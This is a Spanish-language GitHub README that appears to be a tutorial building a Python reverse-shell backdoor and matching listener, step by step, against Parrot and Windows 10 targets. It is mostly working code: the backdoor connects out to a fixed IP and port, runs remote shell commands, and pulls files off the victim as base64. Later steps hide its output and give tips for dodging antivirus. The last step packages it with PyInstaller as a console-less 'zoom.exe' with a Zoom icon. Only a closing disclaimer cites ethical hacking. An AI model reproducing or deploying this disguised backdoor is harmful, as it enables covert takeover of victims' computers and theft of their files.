# BACKDOOR-LABORATORIO-


# Parrot (TARGET) 
# Ubuntu (Hacker) 
 
 
 

* backdoor.py 

 

 ```bash
import socket 

 
 connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

 
 connection.connect(("192.168.1.133",4444) 
 ```
 
 ![conexion establecida](https://user-images.githubusercontent.com/97669969/157425171-0e04af3b-ebc1-4777-b469-7e3cb254caae.png)


# Ubuntu  
* Abrimos un  listener usando ncat 
```bash 
ncat -l -vv 4444
 ```
 
![ubntu conexion establecida](https://user-images.githubusercontent.com/97669969/157425354-1970f60b-3aab-4970-babd-6d52825d4fce.png)
* Perfecto, funciona, pero vamos a mejorarlo. # HackmodeON!
 
 
 
 
 
# Parrot (Target) 

 

# backdoor.py 

 
```bash
import socket 

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

 
 

connection.connect(("192.168.1.133",4444)) 

 
 

connection.send("\n [+] Conexion establecida".encode()) 

 
 

datos_recibidos = connection.recv(1024) 

 
 

print(datos_recibidos) 

 
 

connection.close() 
```
![conexion establecida 1024](https://user-images.githubusercontent.com/97669969/157426135-5f81ed56-5ba2-44c6-9c45-1ab7afed6539.png)


# Ubuntu (Hacker) 


* Abrimos listener con ncat 
```bash
ncat -l -vv 4444 
```
![conexion establecida 10242](https://user-images.githubusercontent.com/97669969/157426495-4534160d-bc17-41cd-b5de-0eb300e9dbec.png)
* Conexion establecida.



# Parrot (Target) 

 # Mejoramos codigo,implementamos ejecution de comandos. 

 
# backdoor.py 

 
```bash
import socket 

import subprocess 

 
 

def ejecutar_comando(comando): 

return subprocess.check_output(comando,shell=True) 

 
 

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

connection.connect(("192.168.1.133",4444)) 

connection.send("\n [+] Conexion establecida \n".encode()) 

 
 

while True: 

 
 

comando = connection.recv(1024) 

resultado_comando = ejecutar_comando(comando) 

connection.send(resultado_comando) 

 
 

connection.close() 
```

![conexion establecida parrot listener](https://user-images.githubusercontent.com/97669969/157427320-498682d2-a0e0-4a57-b53b-9b0f9ffc31b0.png)




# Ubuntu (Hacker) 

* Listener abierto  

```bash 
ncat -l -vv 4444 
```


![comandos ubuntu](https://user-images.githubusercontent.com/97669969/157427016-d88259d8-ec81-4039-a655-0de6c1195e4f.png)

 
 # HackModeON! > VAMOS A CREAR NUESTRO PROPIO LISTENER CON PYTHON !

 

 
# listener.py 
 ```bash
import socket 

 
 

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

 
 

listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1) 

 
 

listener.bind(("192.168.1.133" ,4444)) 

 
 

listener.listen(0) 

 
 

print("[+] Esperando por conexiones") 

 
 

connection,addres = listener.accept() 

 
 

print("[+] Tenemos una conexion de {}".format(addres)) 

 
 

while True: 

        command = input("shell $") 

        connection.send(command.encode()) 

        result = connection.recv(1024) 

        print(result) 
 ```
 
# Ubuntu (Hacker)

![conexion establecida con listener](https://user-images.githubusercontent.com/97669969/157427835-65dd4277-6427-4100-9148-03d52ef7e252.png)


# Parrot (Target) 

![comandos parrot](https://user-images.githubusercontent.com/97669969/157428090-f9988f75-cd6b-4d9d-833d-2cfb17c7ddb6.png)
* Conexion establecida.




# MEJORA DE CODIGO EN LISTENER 

* listener.py 

 
```bash
import socket 

 
class Listener: 

 
 

    def __init__(self,ip, port): 

listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1) 

listener.bind((ip,port)) 

listener.listen(0) 

print("[+] Esperando por conexiones") 

self.connection,addres = listener.accept() 

print("[+] Tenemos una conexion de {}".format(addres)) 

result = self.connection.recv(1024) 

print(result.decode("utf-8")) 

 
 

def ejecutar_remoto(self,comando): 

self.connection.send(comando.encode()) 

return self.connection.recv(1024).decode("utf-8") 

 

    def run(self): 

 while True: 

       comando = input("shell $ ") 

       resultado = self.ejecutar_remoto(comando) 

                  print("\n" + resultado) 

 
 

escuchar = Listener("192.168.1.133",4444) 

 

escuchar.run() 
```

# Ubuntu (Hacker)

![mejora de listener ubuntu](https://user-images.githubusercontent.com/97669969/157429579-137d26d8-1d98-487f-9fd5-f81a7be5e82d.png)


# Parrot (Target) 

![mejora de listener parrot](https://user-images.githubusercontent.com/97669969/157429636-e6980d52-9f1d-4036-998d-9730229f04fa.png)
* Backdoor corriendo, vamos a mejorarlo tambien.




# MEJORA DE CODIGO EN BACKDOOR 

 

* backdoor.py 

 
```bash
import socket 

import subprocess 

 
class Backdoor: 

 
 

    def __init__(self,ip,port): 

self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

self.connection.connect((ip,port)) 

self.connection.send("\n [+] Conexion establecida \n".encode()) 

 
 
 

    def ejecutar_comando(self,comando): 

return subprocess.check_output(comando,shell=True) 

 
 
 

    def run(self): 

while True: 

 
 

comando = self.connection.recv(1024) 

resultado_comando = self.ejecutar_comando(comando.decode("utf-8")) 

self.connection.send(resultado_comando) 

           self.connection.close() 

 

backdoor = Backdoor("192.168.1.133", 4444) 

backdoor.run() 
```
# Parrot (Target) 

![mejora de backdoor parrot](https://user-images.githubusercontent.com/97669969/157429977-cf4873b8-718a-47fa-ab66-c4a5e469a7f6.png)


# Ubuntu (Hacker) 

![mejora de listener ubuntu](https://user-images.githubusercontent.com/97669969/157430065-cc51ba25-7964-4e99-b3ac-d1742a7328e1.png)
*  Listener corriendo correctamente. 



# MEJORA DE CODIGO IMPLEMENTAMOS ENVIO DE DATOS CON JSON  

 
 * backdoor.py 

 
```bash
import socket 

import subprocess 

import json 

 
 

class Backdoor: 

 
 

    def __init__(self,ip,port): 

self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 

self.connection.connect((ip,port)) 

self.connection.send("\n [+] Conexion establecida \n".encode()) 

     

    def envio_seguro(self, datos): 

json_data = json.dumps(datos) 

self.connection.send(json_data.encode()) 

 
 

    def reception_segura(self): 

     json_data = "" 

        while True: 

 
          try: 

json_data = self.connection.recv(1024).decode("utf-8") 

return json.loads(json_data) 

          except ValueError: 

                  continue 

 

    def ejecutar_comando(self,comando): 

           return subprocess.check_output(comando,shell=True) 

 
 
 

   def run(self): 

          while True: 

 
 

comando = self.reception_segura() 

resultado_comando = self.ejecutar_comando(comando) 

self.envio_seguro(resultado_comando.decode("utf-8")) 

          self.connection.close() 

 
 

backdoor = Backdoor("192.168.1.133",4444) 

backdoor.run() 
```

# Parrot (Target) 

![envio de datos con json parrot](https://user-images.githubusercontent.com/97669969/157430267-679c5134-3815-4b01-aad7-526aece66a58.png)


# Ubuntu (Hacker)

![json ubuntu](https://user-images.githubusercontent.com/97669969/157430358-2b565c49-fb47-431d-b164-766bb49849f8.png)
* Listo, vamos mejorando aun mas.


# MEJORA DE CODIGO AGREGAMOS COMANDO "salir"

* backdoor.py

```bash

import socket
import subprocess
import json

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n [+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True)


    def run(self):
        while True:

            comando = self.reception_segura()

            if comando[0] == "salir":
                self.connection.close()
                exit()
            
            else:
                resultado_comando = self.ejecutar_comando(comando)
                self.envio_seguro(resultado_comando.decode("utf-8"))
        self.connection.close()

backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```

# Parrot (Target)

![comando salir](https://user-images.githubusercontent.com/97669969/157431928-5c779e9d-5911-4092-a241-c386a0842521.png)



# Ubuntu (Hacker)

* listener.py

```bash
import socket
import json

class Listener:

    def __init__(self,ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection,addres = listener.accept()
        print("[+] Tenemos una conexion de {}".format(addres))
        result = self.connection.recv(1024)
        print(result.decode("utf-8"))
    
    def envio_seguro(self,comando):
        json_data = json.dumps(comando)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        while True:

            try:
                json_data = self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
                
            except:
                continue

      
    def ejecutar_remoto(self,comando):
        self.envio_seguro(comando)
        
        if comando[0] == "salir":
            self.connection.close()
            exit()
            
        return self.reception_segura()
    
    
    def run(self):
         while True:
            comando = input("shell $ ")
            comando = comando.split(" ")
            
            resultado = self.ejecutar_remoto(comando)
            print("\n" + resultado)

escuchar = Listener("192.168.1.133",4444)

escuchar.run()
```

![comando salir  ubuntu ](https://user-images.githubusercontent.com/97669969/157432117-104c5bf4-55c1-4d62-8f15-f6db00b02ebc.png)


# MEJORA DE CODIGO AGREGANDO COMANDO "cd"

* backdoor.py

```bash
import socket
import subprocess
import json
import os

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n [+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True)

    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {}".format(ruta).encode()

    def run(self):
        while True:

            comando = self.reception_segura()

            if comando[0] == "salir":
                self.connection.close()
                exit()
            elif comando[0] == "cd" and len(comando) > 1:
                resultado_comando = self.cambiar_directorio(comando[1])
            else:
                resultado_comando = self.ejecutar_comando(comando)
                
            self.envio_seguro(resultado_comando.decode("utf-8"))
       

backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```

# Parrot (Target)

![agregando comando cd parrot](https://user-images.githubusercontent.com/97669969/157443431-a06494a4-05be-4d80-bfec-8e4dc9d1c3b7.png)


# Ubuntu (Hacker) 

* En el listener no modificamos ningun codigo, es el backdoor el que ejecuta.


![agregando comando cd ubuntu](https://user-images.githubusercontent.com/97669969/157443616-4c26c46e-3fd3-4894-b695-919cb9ec26ba.png)
* Comando cd cd .. funcionando perfectamente.


# MEJORA DE CODIGO IMPLEMENTAMOS OPCION DE "descargar"

* backdoor.py

```bash
import socket
import subprocess
import json
import os

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n [+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True)

    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {}".format(ruta).encode()
    
    def leer_archivo(self,ruta):
        with open(ruta,"rb") as file:
            return file.read()

    def run(self):
        while True:

            comando = self.reception_segura()

            if comando[0] == "salir":
                self.connection.close()
                exit()
            elif comando[0] == "cd" and len(comando) > 1:
                resultado_comando = self.cambiar_directorio(comando[1])
            elif comando[0] == "descargar":
                resultado_comando = self.leer_archivo(comando[1])
            else:
                resultado_comando = self.ejecutar_comando(comando)
                
            self.envio_seguro(resultado_comando.decode("utf-8"))
       

backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```

# Parrot (Target)

![implementamos opcion de descargar parrot](https://user-images.githubusercontent.com/97669969/157447199-e1c6c206-5de9-4f4c-add2-1ae7c601c988.png)



# Ubuntu (Hacker)

* listener.py

```bash
import socket
import json
from unittest import result

class Listener:

    def __init__(self,ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection,addres = listener.accept()
        print("[+] Tenemos una conexion de {}".format(addres))
        result = self.connection.recv(1024)
        print(result.decode("utf-8"))
    
    def envio_seguro(self,comando):
        json_data = json.dumps(comando)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        while True:

            try:
                json_data = self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
                
            except:
                continue

      
    def ejecutar_remoto(self,comando):
        self.envio_seguro(comando)
        
        if comando[0] == "salir":
            self.connection.close()
            exit()
            
        return self.reception_segura()
    
    def escribir_archivo(self,ruta,contenido):
        with open(ruta,"wb") as file:
            file.write(contenido.encode())
            return "[+] Descarga completa!!"

    def run(self):
         while True:
            comando = input("shell $ ")
            comando = comando.split(" ")
            resultado = self.ejecutar_remoto(comando)
            if comando[0] == "descargar":
                resultado = self.escribir_archivo(comando[1],resultado)
            print("\n" + resultado)

escuchar = Listener("192.168.1.133",4444)

escuchar.run()
```

![implemenatmos opcion de descargar ubuntu](https://user-images.githubusercontent.com/97669969/157447537-8cca432a-a6cc-49b9-bba7-e65dc9a378e0.png)



# MEJORA DE CODIGO IMPLEMENTAMOS "descargar" IMAGENES Y MEJORAMOS listener y backdoor
 
 * backdoor.py

```bash
import socket
import subprocess
import json
import os
import base64

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n [+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True).decode("utf-8")

    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {}".format(ruta)
    
    def leer_archivo(self,ruta):
        with open(ruta,"rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")

    def run(self):
        while True:

            comando = self.reception_segura()

            if comando[0] == "salir":
                self.connection.close()
                exit()
            elif comando[0] == "cd" and len(comando) > 1:
                resultado_comando = self.cambiar_directorio(comando[1])
            elif comando[0] == "descargar":
                resultado_comando = self.leer_archivo(comando[1])
            else:
                resultado_comando = self.ejecutar_comando(comando)
                
            self.envio_seguro(resultado_comando)
       

backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```

# Parrot (Target)

![implementamos descarag de imagenes parrot](https://user-images.githubusercontent.com/97669969/157455682-3a8649f7-37af-4ffa-8e99-d3d49d2c7065.png)
* Backdoor corriendo corectamente.


# Ubuntu (Hacker)

![implementamos descaraga de imagenes ubuntu](https://user-images.githubusercontent.com/97669969/157455902-bf526204-6ea1-42a9-bff0-4ee779c896b5.png)
* Correctamente funcionando, imagen descargada.



# HACEMOS MEJORAS EN CUANTO AL CODIGO , QUITANDO ERRORES 
 
 * Implementamos mejoras por si nos equivocamos de comando.

* backdoor.py

```bash
import socket
import subprocess
import json
import os
import base64

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True).decode("utf-8")

    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {} \n".format(ruta)
    
    def leer_archivo(self,ruta):
        with open(ruta,"rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")

    def run(self):
        while True:
            comando = self.reception_segura()
            try:
                if comando[0] == "salir":
                    self.connection.close()
                    exit()
                elif comando[0] == "cd" and len(comando) > 1:
                    resultado_comando = self.cambiar_directorio(comando[1])
                elif comando[0] == "descargar":
                    resultado_comando = self.leer_archivo(comando[1])
                else:
                    resultado_comando = self.ejecutar_comando(comando)
            except Exception:
                resultado_comando = "[-] Error de ejecution \n"

            self.envio_seguro(resultado_comando)
       
backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```

# Parrot (Target)

![mejora de codigo error de cd cdh](https://user-images.githubusercontent.com/97669969/157463211-4ef6136c-1f4b-466b-900c-df3066b092b1.png)




# Ubuntu (Hacker)

* listener.py

```bash
import socket
import json
from unittest import result
import base64

class Listener:

    def __init__(self,ip, port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Esperando por conexiones")
        self.connection,addres = listener.accept()
        print("[+] Tenemos una conexion de {}".format(addres))
        result = self.connection.recv(1024)
        print(result.decode("utf-8"))
    
    def envio_seguro(self,comando):
        json_data = json.dumps(comando)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        while True:

            try:
                json_data =json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
                
            except:
                continue

      
    def ejecutar_remoto(self,comando):
        self.envio_seguro(comando)
        
        if comando[0] == "salir":
            self.connection.close()
            exit()
            
        return self.reception_segura()
    
    def escribir_archivo(self,ruta,contenido):
        with open(ruta,"wb") as file:
            file.write(base64.b64decode(contenido))
            return "[+] Descarga completa!!"

    def run(self):
         while True:
            comando = input("shell $ ")
            comando = comando.split(" ")
            resultado = self.ejecutar_remoto(comando)
            if comando[0] == "descargar":
                resultado = self.escribir_archivo(comando[1],resultado)
            print("\n" + resultado)

escuchar = Listener("192.168.1.133",4444)

escuchar.run()
```


![mejora de codnig error cd cde ubuntu](https://user-images.githubusercontent.com/97669969/157463472-24b60935-37be-49f1-8268-505b6dc947b7.png)
* Si en vez de cd se usa cde > por ex. El programa nos avisa de dicho error de ejecution, lo cual esta bien.




# BACKDOOR EN WINDOWS 
 
 * En windows solo tenemos que agregar .decode("windows-1252") a la siguente function en backdoor.py > 

# backdoor.py
```bash
 def ejecutar_comando(self,comando):
        return subprocess.check_output(comando,shell=True).decode("windows-1252")
```

# El resto del codigo sigue igual, tanto listener como backdoor.
* Siempre respetando la ip, el listener y el backdoor apuntan donde va estar el listener.

# Windows 10 (Target)

![backdoor en windows](https://user-images.githubusercontent.com/97669969/157506726-ced0e594-c119-4996-b584-74293717e3e1.png)
 * Backdoor corriendo correctamente, sistema infectado.

# Ubuntu (Hacker)

![backdoor en windows ubuntu](https://user-images.githubusercontent.com/97669969/157506923-f0d9b136-a183-4811-b549-8873cde3bec8.png)
* Tenemos acceso total a la maquina.




# Seguimos mejorando el codigo, con sys y DEVNULL 

* Mejora necesaria para el backdoor-windows.py para que no tengamos ningun error, y hacerlo INVISIBLE en el sistema.

```bash
import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:

    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))
        self.connection.send("\n[+] Conexion establecida \n".encode())
    
    def envio_seguro(self, datos):
        json_data = json.dumps(datos)
        self.connection.send(json_data.encode())

    def reception_segura(self):
        json_data = ""
        
        while True:
            try:
             
               json_data = self.connection.recv(1024).decode("utf-8")
               return json.loads(json_data)
            except ValueError:
                continue
    
    def ejecutar_comando(self,comando):
        DEVNULL = open(os.devnull,"wb")
        return subprocess.check_output(comando,shell=True,stderr=DEVNULL,stdin=DEVNULL).decode("windows-1252")

    def cambiar_directorio(self,ruta):
        os.chdir(ruta)
        return "[+] Cambiando de directorio a {} \n".format(ruta)
    
    def leer_archivo(self,ruta):
        with open(ruta,"rb") as file:
            return base64.b64encode(file.read()).decode("utf-8")

    def run(self):
        while True:
            comando = self.reception_segura()
            try:
                if comando[0] == "salir":
                    self.connection.close()
                    sys.exit()
                elif comando[0] == "cd" and len(comando) > 1:
                    resultado_comando = self.cambiar_directorio(comando[1])
                elif comando[0] == "descargar":
                    resultado_comando = self.leer_archivo(comando[1])
                else:
                    resultado_comando = self.ejecutar_comando(comando)
            except Exception:
                resultado_comando = "[-] Error de ejecution \n"

            self.envio_seguro(resultado_comando)
       
backdoor = Backdoor("192.168.1.133",4444)
backdoor.run()
```
# Parrot (Target)
![importaMOS SYS](https://user-images.githubusercontent.com/97669969/157521319-5e84467d-18bb-4a05-a7b6-fb82149ce8a7.png)


# BACKDOOR INDETECTABLE

* Backdoor sigue indetectable por el antivirus puesto que es un archivo.py, y no .exe , enseguida lo convertimos a exe.

* Como te diste cuenta en el backdoor use palabras como "backdoor" "ejecutar_comando" lo cual salta las alarmas y no es la mejor manera de desarrollar un virus      un backdoor, pero aqui es una clase de desarrollo de un backdoor unicamente, la imaginacion es tuya.




# Y como lo hacemos indetectable?
 
 
 # La Invisibilidad, y como se consigue>?
 ```bash
Lo mejor seria usar palabras y frases cuales SOLO tu reconozcas! Sin que ningun antivirus pueda leerlos como amenazas.

```




# BACKDOOR ".EXE"


# En primer lugar dezactiva tu antivirus, para asegurar que no interrumpa el trabajo.

![antivirus](https://user-images.githubusercontent.com/97669969/157541384-efc9e133-929a-415d-93fa-640123718ea7.png)


* Necesitamos un icono , puede ser tipo zoom, whatsapp, tiktok, etc. de extension .ico 
* Todo lo pones en la misma carpeta tanto el backdoor como el icono, ex > Downloads.

* Abre cmd (dir , cd Downloads, chdir, aseguramos que todo esta presente en la carpeta Downloads.

```bash
pip -V
```
* Si no esta lo instalamos :

```bash
pip install pyinstaller
```

* Generamos el .exe 
```bash
pyinstaller --onefile --windowed --noconsole -i=zoom.ico backdoor-windows.py --name zoom
```



# Diccionario

* --onefile ( que genere menos archivos)
* --windowed (ocultar consola)
* --noconsole (que no abra la consola)
* -i=zoom.ico ( imagen de executable, en mi caso elegí zoom)
* backdoor-windows.py (nombre del backdoor)
* --name (el nombre que le voy a poner a my backdoor)

![zoom windows](https://user-images.githubusercontent.com/97669969/157544457-163f87bc-bae0-40d0-ae38-5d957f05b613.png)
* En la carpeta dist , se encuentra el .exe.


# Al abrir el .exe, el listener abre conexion enseguida, el listener tiene que correr siempre.
![zoom ubuntu](https://user-images.githubusercontent.com/97669969/157545308-a79ea6c7-3afb-494b-91b2-4f5f623fde1b.png)

















# TMCyber offers its information on the Internet basically for the benefit of people interested in the efforts and in favor of the implementation of the protection and promotion of computer security (Cybersecurity) and Ethical Hacking'
# TMCyber is not responsible for the misuse of this tool'


### If this project help you reduce time to develop, you can give me a cup of coffee :)


 <a href="https://www.buymeacoffee.com/tonymerisan" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/E1E1EBFQ3)

[![Typing SVG](https://readme-typing-svg.herokuapp.com?font=Courier+new&color=%23808080&size=30&width=1000&duration=6969&lines=I+am+not+responsible+for+[the+misuse+of+my+tools]!)](https://git.io/typing-svg)
